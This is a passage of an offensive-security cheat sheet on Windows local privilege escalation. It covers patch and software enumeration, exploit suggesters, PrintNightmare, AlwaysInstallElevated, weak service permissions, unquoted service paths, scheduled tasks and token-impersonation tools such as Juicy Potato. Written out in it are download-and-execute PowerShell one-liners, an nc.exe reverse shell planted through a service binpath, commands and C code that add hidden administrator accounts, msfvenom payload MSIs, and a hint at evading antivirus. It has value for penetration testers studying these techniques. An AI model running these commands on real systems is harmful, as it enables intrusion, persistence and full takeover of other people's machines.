Get-Item <FILE_NAME> -stream *
streams.exe -accepteula -s <DIRECTORY>
streams.exe -accepteula <FILE_NAME>

# Retrieve ADS content
more < <FILE_NAME>:<ADS_NAME>
Get-Content <FILE_NAME> -stream <ADS_NAME>
LS.exe <FILE_NAME>

# Write ADS content
echo "<INPUT>" > <FILE_NAME>:<ADS_NAME>
Set-Content <FILE_NAME> -stream <ADS_NAME> -Value "<INPUT>"
Add-Content <FILE_NAME> -stream <ADS_NAME> -Value "<INPUT>"

# Remove ADS
Remove-Item –path <FILE_PATH> –stream <ADS_NAME>
streams.exe -accepteula -d <FILE_NAME>
```

### Unpatched system

###### OS and Kernel version

The following commands or actions can be used to get the updates installed on
the host:

| DOS | Powershell | WMI |
|-----|------------|-----|
| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix<br/> Get-WindowsUpdateLog | wmic qfe get HotFixID,InstalledOn,Description |

Windows releases information:

| NT Version | Build | Marketing name |
|------------|-------|----------------|
| 3.1 | 528 | Windows NT 3.1 |
| 3.5 | 807	| Windows NT 3.5 |
| 3.51 | 1057 | Windows NT 3.51 |
| 4.0 | 1381 | Windows NT 4.0 |
| 5.0 | 2195 | Windows 2000 |
| 5.1 | 2600 | Windows XP |
| 5.2 | 3790 | Windows XP x64 <br/> Windows Server 2003 <br/> Windows Server 2003 R2 |
| 6.0 | 6000 <br/> 6001 | Windows Vista <br/> Windows Server 2008 |
| **6.1** | **7600** | **Windows 7** <br/> **Windows Server 2008 R2** |
| 6.2 | 9200 | Windows 8 <br/> Windows Server 2012 |
| **6.3** | **9600** | Windows 8.1 <br/> **Windows Server 2012 R2** |
| **10.0** | 10240 (TH1) / 10586 (TH2) <br/> 14393 (RS1) / 15063 (RS2) / 16299 (RS3) / 17134 (RS4) / 17763 (RS5) | Windows 10 <br/> Windows Server 2016 |

Automatically compare the system patch level to public known exploits:

###### Installed software

The following commands can be used to enumerate the software installed on the
local system:

```
# Lists the software installed on the system.
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, REGISTRY::HKEY_USERS\S-1-5-21-*\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where {$_.DisplayName -notLike "" -or $_.InstallLocation -notlike ""} | Select DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation  | fl

# Returns a partial list of the software installed on the system.
wmic product get name,version
```

###### Exploits detection tools

*Windows Exploit Suggester - Next Generation (WES-NG)*

-- Replace Windows-Exploit-Suggester --

The `WES-NG` Python script compares a target patch level, retrieved using
`systeminfo`, and the Microsoft vulnerability database in order to detect
potential missing patches on the target.

```
wes.py --update

# --muc-lookup: Conducts false positives verification using the Microsoft's Update Catalog to determine if installed patches supersedes potentially missing KBs
wes.py --muc-lookup <SYSTEMINFO_FILE>
```

*Windows-Exploit-Suggester (outdated)*

Outdated: Microsoft replaced the Microsoft Security Bulletin Data Excel
file, on which Windows-Exploit-Suggester is fully dependent, by the MSRC API.
The Microsoft Security Bulletin Data Excel file has not been updated since Q1
2017, so later operating systems and vulnerabilities can no longer be
assessed --

The `windows-exploit-suggester` script compares a targets patch levels against
the Microsoft vulnerability database in order to detect potential missing
patches on the target.  
It also notifies the user if there are public exploits and `Metasploit` modules
available for the missing bulletins.  
It requires the `systeminfo` command output from a Windows host in order to
compare that the Microsoft security bulletin database and determine the patch
level of the host.  
It has the ability to automatically download the security bulletin database
from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

```
# python windows-exploit-suggester.py --update

python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO_FILE>
```

If the `systeminfo` command reveals 'File 1' as the output for the hotfixes,
the output of `wmic qfe list full` should be used instead using the --hotfixes
flag, along with the `systeminfo`:

```
python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
```

*Watson*

`Watson` (replaces `Sherlock`) is a .NET tool designed to enumerate missing KBs
and suggest exploits. Only works on Windows 10 (1703, 1709, 1803 & 1809) and
Windows Server 2016 & 2019.

`Watson` must be compiled for the .NET version supported on the target.

*Sherlock (outdated)*

Outdated: Microsoft changed to rolling patches on Windows instead of hotfixes
per vulnerability, making the detection mechanism of `Sherlock` non functional.

PowerShell script to find missing software patches for critical vulnerabilities
that could be leveraged for local privilege escalation.

To download and execute directly into memory:

```
# CMD
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
```

*(Metasploit) Local Exploit Suggester (outdated)*

The `local_exploit_suggester` module suggests local `meterpreter` exploits that
can be used against the target, based on the architecture and platform as well as
the available exploits in `meterpreter`.

 ```
meterpreter> run post/multi/recon/local_exploit_suggester

# OR

msf> use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session-id>
msf post(local_exploit_suggester) > run
```

###### Pre compiled exploits

A collection of pre compiled Windows kernel exploits can be found on the
`windows-kernel-exploits` GitHub repository. Use at your own risk.

```
https://github.com/SecWiki/windows-kernel-exploits
```

###### Compilers

*mingw*

An exploit in C can be compiled on Linux to be used on a Windows system using
the cross-compiler `mingw`:

```
# 32 bits
i686-w64-mingw32-gcc -o exploit.exe exploit.c

# 64 bits
x86_64-w64-mingw32-gcc -o exploit.exe exploit.c
```

*PyInstaller*

If an exploit is only available as a Python script and Python is not installed
on the target, `PyInstaller` can be used to compile a stand alone executable of
the Python script:

```
pyinstaller --onefile <SCRIPT>.py
```

`PyInstaller` should be used on a Windows operating system.

###### PrintNightmare (CVE-2021-1675)

On unpatched systems with the `Print Spooler` service running, the
`PrintNightmare` vulnerability (`CVE-2021-1675`) can be leveraged, in addition
to remote code execution, for local privilege escalation. The `PrintNightmare`
vulnerability basically result in the execution of an arbitrary `DLL` under
`NT AUTHORITY\SYSTEM` privileges. For more details on the `PrintNightmare`
vulnerability, refer to the `[L7] 135 - MSRPC` note.

The status of the `Print Spooler` service on the local system can be retrieved
using the following PowerShell cmdlets:

```
# Returns "Cannot find path '\\127.0.0.1\pipe\spoolss' because it does not exist" if the Print Spooler service is not running.
gci \\127.0.0.1\pipe\spoolss

# Retrieves the status of the Print Spooler service on the local system.
Get-Service Spooler
```

The [`nightmare-dll DLL`](
https://github.com/calebstewart/CVE-2021-1675/tree/main/nightmare-dll) creates
a local user (using the `Win32`'s `NetUserAdd` API) and add it to the local
`Administrators` group (using the `Win32`'s `NetLocalGroupAddMembers` API). It
may be used as a `DLL` template for `PrintNightmare` exploitation.
Alternatively, a payload `DLL` may be generated using, for example, `msfvenom`.

The [`CVE-2021-1675.ps1` PowerShell
script](`https://github.com/calebstewart/CVE-2021-1675`) can be used to locally
elevate privileges by either:
  - using its embedded (Base64-encoded GZIPped) `DLL` to create a local user
    and add it to the local `Administrators` group
  - executing the specified `DLL` under `NT AUTHORITY\SYSTEM` privileges

```
Import-Module .\CVE-2021-1675.ps1

# Adds the specified user to the Administrators group using the script embedded DLL.
Invoke-Nightmare -DriverName "<Xerox | DRIVER_NAME>" -NewUser "<USERNAME>" -NewPassword "<PASSWORD>"

# Executes the given DLL under `NT AUTHORITY\SYSTEM` privileges.
Invoke-Nightmare -DLL "<FULL_PATH_DLL>"
```

Alternatively, the [`SharpPrintNightmare` `C#`
implementation](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare)
can be used for local privilege escalation purposes (in addition to remote code
execution):

```
SharpPrintNightmare.exe "<FULL_PATH_DLL>"
```

`CVE-2021-1675.ps1` and `SharpPrintNightmare` (in `LPE` mode) present the
advantage of not relying on the `RPC` or `SMB` protocols as the
`AddPrinterDriverEx` and `EnumPrinterDrivers` APIs are called directly.

### AlwaysInstallElevated policy

Windows provides a mechanism which allows unprivileged users to install Windows
installation packages, `Microsoft Windows Installer Package (MSI)` files,
with `NT AUTHORITY\SYSTEM` privileges. This policy is known as
`AlwaysInstallElevated`.

If activated, this mechanism can be leveraged to elevate privileges on the
system by executing code through the `MSI` during the installation process as
`NT AUTHORITY\SYSTEM`.

The Windows built-in `req` utility and the `PowerUp` PowerShell script can be
used to check whether the `AlwaysInstallElevated` policy is enabled on the
host by querying the associated registry key:

```
# If "REG_DWORD 0x1" is returned the policy is activated.
# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated.
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
PS> Get-RegistryAlwaysInstallElevated
```

The policy can be abused to elevate privileges:

  - By executing a given binary or `bat` script through a specifically crafted
    `MSI` installer using the
    [`MSI Wrapper`](https://www.exemsi.com/download/) graphical application or
    `msfvenom`.

  - By adding a local user to the local `Administrators` group using the
    `MSI` installer embedded in the `PowerUp`'s `Write-UserAddMSI` PowerShell
    cmdlet. The cmdlet will open a graphical interface to specify the user to
    be added.

  - Through a `meterpreter` session using the `Metasploit`'s
    `exploit/windows/local/always_install_elevated` module. The module will
    prevent the installation from succeeding to avoid the registration of the
    program on the system.

Refer to the `[General] File transfer` note for file transfer techniques to
upload the MSI on the targeted system.

```
# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary.
msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>

# MSI Wrapper procedure to generate an MSI that will execute the given binary under elevated privileges:
Executable (2nd page onward)      -> specify the executable to be executed
                                  -> Compression of wrapped file: None
Visibility in Apps & features     -> Visibility of MSI package: Hidden
Security and User context         -> Security context for lauching the executable: Windows Installer
                                  -> Elevation when launching the executable: Always elevate
                                  -> MSI installation context: Per User
                                  -> Check MSI package requires elevation
Application Ids                   -> Upgrade code: Create New.
-> Next -> [...] -> Build.

# Installs the specifed MSI file.
# /quiet: no messages displayed, /qn: no GUI, /i runs as current user.
msiexec /quiet /qn /i <MSI_PATH>

# (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
Write-UserAddMSI

# Requires a meterpreter session.
msf> use exploit/windows/local/always_install_elevated
```

### Services misconfigurations

In Windows NT operating systems, a Windows service is a computer program that
operates in the background, similarly in concept to a Unix daemon.

A Windows service must conform to the interface rules and protocols of the
`Service Control Manager`, the component responsible for managing Windows
services. Windows services can be configured to start with the operating
system, manually or when an event occur.

Vulnerabilities in a service configuration could be exploited to execute code
under the privileges of the user starting the service, often
`NT AUTHORITY\SYSTEM`.

###### Windows services enumeration

The Windows built-ins `sc` and `wmic` can be used to enumerate the services
configured on the target system. The Windows built-in graphical utility
`services.msc` can alternatively be used as well.

```
# List services
Get-WmiObject -Class win32_service | Select-Object Name, DisplayName, PathName, StartName, StartMode, State, TotalSessions, Description
wmic service list config
sc query

# Service config
sc qc <SERVICE_NAME>

# Service status / extended status
sc query <SERVICE_NAME>
sc queryex <SERVICE_NAME>
```

###### Weak services permissions

A weak service permissions vulnerability occurs when an unprivileged user can
alter the service configuration so that the service runs an arbitrary
specified command or executable.

The rights on the service are defined in each service's security descriptor,
formatted according to the `Security Descriptor Definition Language (SDDL)`
definition. The `SDDL` defines the `System Access Control List and (SACL)` and
the `Discretionary Access Control List (DACL)`:
  - Prefix of S: `SACL` which controls the auditing (what access will generate
    an auditing event).
  - Prefix of D: `DACL` which controls the actual permissions / rights over the
    services (and will govern the access to the service).

The `SDDL` uses `Access Control Entry (ACE)` strings in the `DACL` and `SACL`
components of a security descriptor string. Each `ACE` in a security descriptor
string is enclosed in parentheses in which an user account and their associated
permissions / rights are represented.

The fields of the `ACE` are in the following order and are separated by
semicolons (;).

```
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;(resource_attribute)
```

In case of services, the fields `ace_type`, `rights` and `account_sid` are
usually the only ones being set.

The `ace_type` field is usually either set to `Allow (A)` or `Deny (D)`. The
`rights` field is a string that indicates the access rights controlled by
the `ACE`, usually composed of pair of letters each representing a specific
permission. Finally, the `account_sid` represent the security principal
assigned with the permissions and can either be a two letters known alias or a
`SID`.

The following known aliases can be encountered:

| Alias | Name |
|-------|-----------------------------------------|
| `AN` | Anonymous logon |
| `AO` | Account operators |
| `AU` | Authenticated users |
| `BA` | Built-in administrators |
| `BG` | Built-in guests |
| `BO` | Backup operators |
| `BU` | Built-in users |
| `CA` | Certificate server administrators |
| `CG` | Creator group |
| `CO` | Creator owner |
| `DA` | Domain administrators |
| `DC` | Domain computers |
| `DD` | Domain controllers |
| `DG` | Domain guests |
| `DU` | Domain users |
| `EA` | Enterprise administrators |
| `ED` | Enterprise domain controllers |
| `IU` | Interactively logged-on user |
| `LA` | Local administrator |
| `LG` | Local guest |
| `LS` | Local service account |
| `NO` | Network configuration operators |
| `NS` | Network service account |
| `NU` | Network logon user |
| `PA` | Group Policy administrators |
| `PO` | Printer operators |
| `PS` | Personal self |
| `PU` | Power users |
| `RC` | Restricted code |
| `RD` | Terminal server users |
| `RE` | Replicator |
| `RS` | RAS servers group |
| `RU` | Alias to allow previous Windows 2000 |
| `SA` | Schema administrators |
| `SO` | Server operators |
| `SU` | Service logon user |
| `SY` | Local system |
| `WD` | Everyone |

The following permissions are worth mentioning in the prospect of local
privilege escalation:

| Ace's rights | Access right | Description |
|--------------|--------------|-------------|
| - | `SERVICE_ALL_ACCESS` | Include all service permissions, notably `SERVICE_CHANGE_CONFIG`. |
| `CC` | `SERVICE_QUERY_CONFIG` | Retrieve the service's current configuration from the SCM. |
| `DC` | `SERVICE_CHANGE_CONFIG` | Change the service configuration, notably grant the right to change the executable file associated with the service. |
| `GA` | `GENERIC_ALL` | Equivalent to all the generic access rights  (read, write and execute access to the service). |
| `GX` | `GENERIC_WRITE` | Equivalent to `SERVICE_QUERY_STATUS` and `SERVICE_CHANGE_CONFIG`. |
| `LC` | `SERVICE_QUERY_STATUS` | Retrieve the service's current status from the SCM. |
| `LO` | `SERVICE_INTERROGATE` | Retrieve the service's current status directly from the service itself. |
| `RC` | `READ_CONTROL` | Read the security descriptor of the service. |
| `RP` | `SERVICE_START` | Start the service. |
| `SW` | `SERVICE_ENUMERATE_DEPENDENTS` | List the services that depend on the service. |
| `WD` | `WRITE_DAC` | Modify the DACL of the service in its security descriptor. |
| `WO` | `WRITE_OWNER` | Change the owner of the service in its security descriptor. |
| `WP` | `SERVICE_STOP` | Stop the service. |

A more comprehensive list of the access rights for Windows services can be
found in the
[official Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
`PowerUp` script can be used to list the services an user can exploit:

```
# List services that configure permissions for the "Everyone" / "Tout le monde" user groups
accesschk.exe -accepteula -uwcqv "Everyone" *
accesschk64.exe -accepteula -uwcqv "Everyone" *
accesschk.exe -accepteula -uwcqv "Tout le monde" *
accesschk64.exe -accepteula -uwcqv "Tout le monde" *

# List services that configure permissions for the specified user
accesschk.exe -accepteula -uwcqv <USERNAME> *
accesschk64.exe -accepteula -uwcqv <USERNAME> *

# Enumerate all services and their permissions configuration
accesschk.exe -accepteula -uwcqv *
accesschk64.exe -accepteula -uwcqv *

# Retrieve permissions configuration for the specified service
accesschk64.exe -accepteula -uwcqv <SERVICE_NAME>

# (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
# Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
# Get-ModifiableService - returns services the current user can reconfigure
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1")
PS> Get-ModifiableServiceFile
PS> Get-ModifiableService

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-ModifiableServiceFile
meterpreter> powershell_execute Get-ModifiableService
```

If the use of the tools above is not a possibility, the Windows built-in `sc`
can be used to directly retrieve a service's security descriptor's `DACL` (but
not the owner of the service nor the it's `SACL`):

```
sc sdshow <SERVICE_NAME>

# Lists the DACL's ACE of the specified service, excluding rights granted to privileged principals.
$sddl = sc.exe sdshow <SERVICE_NAME> | where { $_ }
$sddl.split('(') | Select-String -NotMatch 'D:', 'BA', 'LA', 'SY', 'PU'

# Enumerates the DACL's ACE of all services, excluding rights granted to privileged principals.
Get-Service | % { Write-Host $_.Name; $sddl = sc.exe sdshow $_.Name ; $sddl.split('(') | Select-String -NotMatch 'D:', 'BA', 'LA', 'SY', 'PU'; Write-Host "`n`n" }

# Enumerates the rights granting modification privileges of all services, excluding rights granted to privileged principals.
Get-Service | % { Write-Host $_.Name; $sddl = sc.exe sdshow $_.Name ; $sddl.split('(') | Select-String -NotMatch 'BA', 'LA', 'SY', 'PU' | Select-String ';-;', 'DC', 'GA', 'GX', 'WD', 'WO' | Select-String -NotMatch 'WD\)'; Write-Host "`n`n" }
```

The `sc` utility can, among others, also be used to alter a service
configuration:

```
# A space is required after binPath=
sc config <SERVICE_NAME> binPath= "net user <USERNAME> <PASSWORD> /add"
sc config <SERVICE_NAME> binPath= "net localgroup administrators <USERNAME> /add"
sc config <SERVICE_NAME> binPath= "<NEW_BIN_PATH>"

# If needed, start the service under Local Service account
sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
sc config <SERVICE_NAME> obj= "\Local Service" password= ""
sc config <SERVICE_NAME> obj="NT AUTHORITY\LocalService" password= ""
```

The `Metasploit` module `exploit/windows/local/service_permissions` can be used
through an existing `meterpreter` session to automatically detect and exploit
weak services permissions to execute a specified payload under NT
AUTHORITY\SYSTEM privileges.

###### Unsecure NTFS permissions on service binaries

Permissive NTFS permissions on the service binary used by the service can be
leveraged to elevate privileges on the system as the user running the service.

If available, the Windows utility `wmic` can be used to retrieve all services
binary paths:

```
wmic service list full | findstr /i "PathName" | findstr /i /v "System32"

Get-WmiObject -Class win32_service -Property PathName | Ft PathName
Get-WmiObject -Class win32_service -Property PathName | Where-Object { $_.PathName -NotMatch "system32"} | Ft PathName
```

The Windows bullet-in `icacls` can be used to determine the `NTFS` permissions
on the services binary:

```
icacls <BINARY_PATH>

Get-ACL <BINARY_PATH | FOLDER_PATH> | Format-List
```

###### Unquoted service binary paths

When a service path is unquoted, the Service Manager will try to find the
service binary in the shortest path, moving up to the longest path until one
works.     
For example, for the path C:\TEST\Service Folder\binary.exe, the space
is treated as an optional path to explore for that service. The resolution
process will first look into C:\TEST\ for the Service.exe binary and, if it
exist, use it to start the service.  

Here is Windows’ chain of thought for the above example:

1. Are they asking me to run  
   "C:\TEST\Service.exe" Folder\binary.exe  
   No, it does not exist.

2. Are they asking me to run  
   "C:\TEST\Service Folder\Service_binary.exe"  
   Yes, it does exist.

In summary, a service is vulnerable if the path to the executable contains
spaces and is not wrapped in quote marks. Exploitation requires write
permissions to the path before the quote mark. Note that unquoted path
for services in `C:\Program Files` and `C:\Program Files (x86)` are usually
not exploitable as unprivileged user rarely have write access in the `C:\` root
directory or in the standard program directories.

In the above example, if an attacker has write privilege in C:\TEST\, he could
create a C:\Service.exe and escalate its privileges to the level of the account
that starts the service.

To find vulnerable services the `wmic` tool and the `Powershell` `PowerUp`
script can be used as well as a manual review of each service metadata using
`sc` queries:

```
# wmic
wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
wmic service get PathName, StartMode | findstr /i /v """
wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
wmic service get name.pathname,startmode | findstr /i /v """

Get-WmiObject -Class win32_service -Property PathName | Where-Object { $_.PathName -NotMatch "system32" -And $_.PathName -NotMatch '"' } | Ft PathName

# (PowerShell) PowerSploit's PowerUp Get-ServiceUnquoted
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Get-UnquotedService

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-ServiceUnquoted
```

The `Metasploit` module `exploit/windows/local/trusted_service_path` can be used
through an existing `meterpreter` session to automatically detect and exploit
unquoted service path to execute a specified payload under `NT AUTHORITY\SYSTEM`
privileges.

######  Windows XP SP0 & SP1

On Windows XP SP0 and SP1, the Windows service `upnphost` is run by
`NT AUTHORITY\LocalService` and grants the permission `SERVICE_ALL_ACCESS` to
all `Authenticated Users`, meaning all authenticated users on the system can
fully modify the service configuration. Du to the End-of-Life status of the
Service Pack affected, the vulnerability will not be fixed and can be used as
an universal privileges escalation method on Windows XP SP0 & SP1.  

```
# accesschk.exe -uwcqv "Authenticated Users" *
# RW upnphost SERVICE_ALL_ACCESS
# sc qc upnphost
# SERVICE_START_NAME : NT AUTHORITY\LocalService

sc config upnphost binpath= "C:\<NC.EXE> -e C:\WINDOWS\System32\cmd.exe <IP> <PORT>"
sc config upnphost binpath= "net user <USERNAME> <PASSWORD> /add && net localgroup Administrators <USERNAME> /add"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""

net stop upnphost
net start upnphost
```

###### Generate new service binary

*Add a local administrator user*

The following C code can be used to add a local administrator user:

```
#include <stdlib.h>

int main() {
  int i;
  i = system("net user <USERNAME> <PASSWORD> /add");
  i = system("net localgroup administrators <USERNAME> /add");
  return 0;
}
```

The C code above can be compiled on Linux using the  cross-compiler `mingw`
(refer to cross compilation above).

*Reverse shell*

The service can be leveraged to start a privileged reverse shell. Refer to the
`[General] Shells - Binary` note.  

###### Service restart

To restart the service:

```
# Stop
net stop <SERVICE_NAME>
Stop-Service -Name <SERVICE_NAME> -Force

# Start
net start <SERVICE_NAME>
Start-Service -Name <SERVICE_NAME>

# Or through a graphical interface:
services.msc
```

If an error `System error 1068` ("The dependency service or group failed to
start."), the dependencies can be removed to fix the service:

```
sc config <SERVICE_NAME> depend= ""
```

### Scheduled tasks & statup commands

Scheduled tasks are used to automatically perform a routine task on the system
whenever the criteria associated to the scheduled task occurs. The scheduled
tasks can either be run at a defined time, on repeat at set intervals, or
when a specific event occurs, such as the system boot.

The scheduled tasks are exposed to the same kinds of misconfigurations flaws
affecting the Windows services. However, note that the Windows GUI utility `Task
Scheduler`, used to configure scheduled task, will always make use of quoted
binary path, thus limiting the occurrence of unquoted scheduled task path.

The Windows built-in `schtasks` can be used to enumerate the scheduled tasks
configured on the system or to retrieve information about a specific scheduled
task.

```
# List all configured scheduled tasks - verbose
schtasks /query /fo LIST /v
Get-ScheduledTask

# Query the specified scheduled task
schtasks /v /query /fo LIST  /tn <TASK_NAME>
Get-ScheduledTask -TaskName <TASK_NAME>

# Start up commands
Get-WMIObject Win32_StartupCommand -NameSpace "root\CIMV2"
```

The commands below can be chained to filter the enabled scheduled tasks name and
action for `NT AUTHORITY\SYSTEM`, `Administrator` or the specified user:   

```
# Windows
schtasks /query /fo LIST /v > <TASKS_LIST_FILE>

# Linux
grep "TaskName\|Task To Run\|Run As User\|Scheduled Task State" <TASKS_LIST_FILE> | grep -B2 -A 1 "Enabled" | grep -B 3 "NT AUTHORITY\\\SYSTEM\|Administrator"
grep "TaskName\|Task To Run\|Run As User\|Scheduled Task State" <TASKS_LIST_FILE> | grep -B2 -A 1 "Enabled" | grep -B 3 <USERNAME>
```

The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
the scheduled tasks binary:

```
icacls <BINARY_PATH>
```

If the current user can modify the binary / script of a scheduled task run by
another user, arbitrary command execution under the other user privileges can
be achieved once the criteria associated to the scheduled task occurs.

Refer to the `[General] Shells - Binary` note for reverse shell binaries /
scripts.  

### Token Privileges abuse

#### Vulnerable privileges

Use the following command to retrieve the current user account token privileges:

```
whoami /priv

whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege"
```

The following tokens can be exploited to gain SYSTEM access privileges:
- `SeAssignPrimaryPrivilege`
- `SeBackupPrivilege`
- `SeCreateTokenPrivilege`
- `SeDebugPrivilege`
- `SeImpersonatePrivilege`
- `SeLoadDriverPrivilege`
- `SeManageVolumePrivilege`
- `SeRestorePrivilege`
- `SeTakeOwnershipPrivilege`
- `SeTcbPrivilege`

For more and updated information on the aforementioned privileges, refer to the
[Priv2Admin](https://github.com/gtworek/Priv2Admin) GitHub repository.

#### SeAssignPrimaryPrivilege / SeImpersonatePrivilege

###### Overview

The `SeAssignPrimaryTokenPrivilege` and the `SeImpersonatePrivilege`
privileges allow, by design, to create a process under the security context of
another user. The `SeAssignPrimaryTokenPrivilege` privilege can be exploited
using the `CreateProcessAsUser()` Win32 API while the `SeImpersonatePrivilege`
privilege can leveraged using the `CreateProcessWithToken()` Win32 API.

The process creation requires however a handle to a primary token of the user
to impersonate. Multiple tools and techniques may be used to obtain a handle
to a token of the `NT AUTHORITY\SYSTEM` account:

| Tool(s) | Description | Technique limitation |
|---------|-------------|----------------------|
| Potato family ([`Potato`](https://github.com/foxglovesec/Potato), [`RottenPotatoNG`](https://github.com/breenmachine/RottenPotatoNG), [`Juicy Potato`](https://github.com/ohpe/juicy-potato)) | Induces the `SYSTEM` account to connect to a controlled `RPC` endpoint using the `CoGetInstanceFromIStorage ` `COM` API function. <br> In `Potato` and `RottenPotatoNG`, the call was used to instantiate a `COM Storage Object` of the `BITS` local service. In `Juicy Potato`, an instance of the service specified in parameter, using its `Class Identifier (CLSID)`, is requested. <br><br> Then the packets received by the controlled `RPC` endpoint are relayed to the `MSRPC` endpoint (on port TCP 135) until an `NTLM` authentication attempt of the `SYSTEM` account is received. <br><br> The `NTLM` authentication attempt is replayed using Windows API calls (`AcquireCredentialsHandle` and `AcceptSecurityContext`) to ultimately obtain a token for the `SYSTEM` account. | Restriction applied starting from the `Windows 10 1809` and `Windows Server 2019` operating system mitigate this attack. <br><br> Indeed the port contacted by the `COM` API function is now fixed to the `MSRPC` endpoint and can not longer be specified, resulting in an impossibility to intercept the NTLM authentication attempt. |
| [`RogueWinRM`](https://github.com/antonioCoco/RogueWinRM) | Exploit the fact that upon starting the `BITS` service attempt an `NTLM` authentication to the `WinRM` service (on port 5985). <br><br> Similarly to the exploitation process of tools from the Potato family, the `NTLM` authentication attempt is relayed through Windows API calls to obtain a token for the `SYSTEM` account. | Requires that the `WinRM` service is not running (default configuration on Windows workstation operating systems, including `Windows 10`, but not on Windows server operating systems). |
| [`PrintSpoofer`](https://github.com/itm4n/PrintSpoofer) | Induces the `SYSTEM` account to connect to a controlled `named pipe` using the `RpcRemoteFindFirstPrinterChangeNotification(Ex)` function of the `Print System Remote Protocol` exposed on the `MS-RPRN` `MSRPC` interface (also known as "Printer Bug"). <br><br> Once the `SYSTEM` account is connected to the controlled `named pipe`, it can be impersonated using the `ImpersonateNamedPipeClient` Win32 API function. | Requires the `Print Spooler` service to be running (or startable by the current user) on the host. |

###### Local service accounts privileges reduction

The `NT AUTHORITY\LOCAL SERVICE` and `NT AUTHORITY\NETWORK SERVICE` are
predefined local accounts notably used by the `Service Control Manager`. By
default, the accounts are granted the `SeImpersonatePrivilege` privilege.

However, some Windows services executed as `NT AUTHORITY\LOCAL SERVICE` or
`NT AUTHORITY\NETWORK SERVICE` will voluntarily limit their privileges and
remove the `SeImpersonatePrivilege` from their access token. In such cases, the
default privileges normally granted to the service accounts can be retrieved by
creating a scheduled task; as the scheduled task process will have all the
default privileges restored.

[FullPowers](https://github.com/itm4n/FullPowers) can be used to automate this
process:

```
# Spawns a new interactive cmd.exe interpreter in place.
FullPowersFullPowers -x

# Execute the specified command.
# -z: Non-interactive process.
FullPowersFullPowers -x [-z] -c <COMMAND>
```

###### Juicy Potato

*`Juicy Potato` is an improved version of `RottenPotatoNG` and its usage is
recommended.*

As stated above, the specification of service `CLSID` is required by `Juicy
Potato`. A list of services' `CLSID` that can be leveraged for privilege
escalation is available on the tool GitHub repository:
`https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md`

```
Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <BINARY>: program to launch
-l <PORT>: COM server listen port

JuicyPotato.exe -t * -c <CLSID> -l <PORT> -p <cmd.exe | powershell.exe | BINARY>
```

###### Rotten Potato x64 w/ Metasploit

On unpatched systems, `RottenPotato` can be used in combination with the
`Metasploit` `meterpreter`'s `incognito module`.

```
# Load the incognito module to toy with tokens
meterpreter > load incognito

# Upload the MSFRottenPotato binary on the target
# Some obfuscation may be needed in order to bypass AV
meterpreter > upload MSFRottenPotato.exe .

# The command may need to be run a few times
meterpreter > execute -f 'MSFRottenPotato.exe' -a '1 cmd.exe'

# The NT AUTHORITY\SYSTEM token should be available as a delegation token
# Even if the token is not displayed it might be available and the impersonation should be tried anyway
meterpreter > list_tokens -u
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
```

###### Tater

`Tater` is a `PowerShell` implementation of the `Potato` exploit and thus works
similarly by targeting the `BITS` service.

```
# Import module (Import-Module or dot source method)
Import-Module ./Tater.ps1
